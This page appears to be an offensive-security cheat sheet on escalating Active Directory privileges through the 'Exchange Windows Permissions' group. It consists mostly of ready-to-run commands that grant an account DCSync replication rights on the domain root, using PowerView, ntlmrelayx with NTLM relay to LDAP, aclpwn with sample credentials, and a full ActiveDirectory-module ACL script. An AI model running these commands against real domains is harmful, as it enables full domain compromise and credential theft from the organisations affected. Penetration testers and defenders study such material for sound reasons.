# Exchange Windows Permissions

Privilege escalation with ACLs in AD by example of the `Exchange Windows Permissions` domain group.

Add user to the `Exchange Windows Permissions` group:

```
PS > Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members snovvcrash
```

Add DCSync rights with PowerView2:

```
PowerView2 > Add-ObjectAcl -TargetDistinguishedName "DC=megacorp,DC=local" -PrincipalName snovvcrash -Rights DCSync -Verbose
```

Add DCSync rights with PowerView3:

```
PS > $cred = New-Object System.Management.Automation.PSCredential("snovvcrash", $(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force))
PowerView3 > Add-DomainObjectAcl -TargetIdentity "DC=megacorp,DC=local" -PrincipalIdentity snovvcrash -Credential $cred -Rights DCSync -Verbose
```

Add DCSync rights with [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/50c76958706577a5005bec2ee1fda9e9fa669a65/impacket/examples/ntlmrelayx/attacks/ldapattack.py#L293):

```
PS > IWR http://10.10.13.37 -UseDefaultCredentials
$ sudo ntlmrelayx.py -t ldap://DC01.megacorp.local --escalate-user snovvcrash
```

Add DCSync rights with aclpwn.py:

* ​[https://github.com/fox-it/aclpwn.py](https://github.com/fox-it/aclpwn.py)​
* ​[https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)​
* ​[https://www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)​

```
$ aclpwn -f snovvcrash -ft user -t megacorp.local -tt domain -d megacorp.local -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p 'Passw0rd!' -sp 'Passw0rd!'
```

Add DCSync rights with ActiveDirectory module:

* ​[https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)​
* Get ACL for the root domain object.
* Get SID for the account to be given DCSync rights.
* Create a new ACL and within it set "Replicating Directory Changes" (GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) and "Replicating Directory Changes All" (GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) rights for the SID from (2).
* Apply changes.

```
PS > Import-Module ActiveDirectory
PS > $acl = Get-Acl "AD:DC=megacorp,DC=local"
PS > $user = Get-ADUser snovvcrash
PS > $sid = New-Object System.Security.Principal.SecurityIdentifier $user.SID
PS > $objectGuid = New-Object guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
PS > $identity = [System.Security.Principal.IdentityReference] $sid
PS > $adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
PS > $type = [System.Security.AccessControl.AccessControlType] "Allow"
PS > $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
PS > $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
PS > $acl.AddAccessRule($ace)
PS > $objectGuid = New-Object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
PS > $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
PS > $acl.AddAccessRule($ace)
PS > Set-Acl -AclObject $acl "AD:DC=megacorp,DC=local"
```
